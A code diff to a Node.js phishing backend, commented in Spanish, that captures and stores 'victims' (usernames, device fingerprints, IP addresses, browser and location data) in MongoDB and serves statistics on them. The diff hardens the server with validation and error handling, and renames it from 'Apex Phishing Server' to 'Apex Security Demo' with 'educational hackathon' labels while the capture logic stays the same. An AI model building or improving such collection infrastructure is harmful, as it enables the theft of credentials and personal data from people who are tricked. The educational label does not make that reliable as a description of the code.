@@ -120,6 +120,7 @@ function parseUserAgent(ua) {
 // Verificar si la víctima ya fue capturada
 async function isAlreadyCaptured(fingerprint) {
   try {
+    if (!fingerprint) return false;
     const count = await victimsCollection.countDocuments({ fingerprint });
     return count > 0;
   } catch (error) {
@@ -131,13 +132,30 @@ async function isAlreadyCaptured(fingerprint) {
 // Guardar víctima en MongoDB
 async function saveVictim(victimData) {
   try {
+    // Validación
+    if (!victimData || typeof victimData !== 'object') {
+      console.error("❌ Invalid victim data");
+      return false;
+    }
+
+    if (!victimData.fingerprint || typeof victimData.fingerprint !== 'string') {
+      console.error("❌ Missing or invalid fingerprint");
+      return false;
+    }
+
     victimData.timestamp = new Date();
     await victimsCollection.insertOne(victimData);
-    console.log(`🎯 Nueva víctima capturada: ${victimData.username} [${victimData.fingerprint.substring(0, 8)}...]`);
+    
+    const fingerprintPreview = victimData.fingerprint.substring(0, 8);
+    const usernameDisplay = victimData.username || 'Unknown';
+    
+    console.log(`🎯 Nueva víctima capturada: ${usernameDisplay} [${fingerprintPreview}...]`);
     return true;
+    
   } catch (error) {
     if (error.code === 11000) {
-      console.log(`⚠️ Víctima duplicada ignorada: ${victimData.fingerprint.substring(0, 8)}...`);
+      const fingerprintPreview = victimData.fingerprint?.substring(0, 8) || 'Unknown';
+      console.log(`⚠️ Víctima duplicada ignorada: ${fingerprintPreview}...`);
       return false;
     }
     console.error("Error guardando víctima:", error);
@@ -161,9 +179,10 @@ async function getVictims() {
 app.get('/', (req, res) => {
   res.json({
     status: 'online',
-    server: 'Apex Phishing Server',
+    server: 'Apex Security Demo',
     version: '3.0.0',
     database: 'MongoDB Atlas ☁️',
+    purpose: '⚠️ EDUCATIONAL - Hackathon Security Demonstration',
     timestamp: new Date().toISOString()
   });
 });
@@ -172,6 +191,15 @@ app.get('/', (req, res) => {
 app.post('/api/capture', async (req, res) => {
   try {
     const data = req.body;
+    
+    // Validar datos requeridos
+    if (!data.fingerprint) {
+      return res.status(400).json({ 
+        success: false, 
+        error: 'Missing fingerprint' 
+      });
+    }
+
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress;
@@ -253,7 +281,7 @@ app.get('/api/stats', async (req, res) => {
       operatingSystems: {},
       devices: {},
       recentVictims: victims.slice(0, 5).map(v => ({
-        username: v.username,
+        username: v.username || 'Unknown',
         timestamp: v.timestamp,
         country: v.network?.country || 'Unknown',
         browser: v.browser?.name || 'Unknown',
@@ -316,9 +344,30 @@ app.delete('/api/clear', async (req, res) => {
   }
 });
 
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error('Unhandled error:', err);
+  res.status(500).json({ 
+    success: false, 
+    error: 'Internal server error' 
+  });
+});
+
 // Manejo de cierre graceful
 process.on('SIGINT', async () => {
   console.log('\n🛑 Cerrando servidor...');
+  try {
+    await client.close();
+    console.log('✅ Conexión a MongoDB cerrada');
+    process.exit(0);
+  } catch (error) {
+    console.error('❌ Error cerrando MongoDB:', error);
+    process.exit(1);
+  }
+});
+
+process.on('SIGTERM', async () => {
+  console.log('\n🛑 SIGTERM recibido, cerrando servidor...');
   try {
     await client.close();
     console.log('✅ Conexión a MongoDB cerrada');
@@ -335,6 +384,7 @@ async function startServer() {
   app.listen(PORT, () => {
     console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
     console.log(`🌐 Entorno: ${process.env.NODE_ENV || 'development'}`);
+    console.log(`⚠️  PROPÓSITO: Demostración educativa de seguridad`);
   });
 }
 
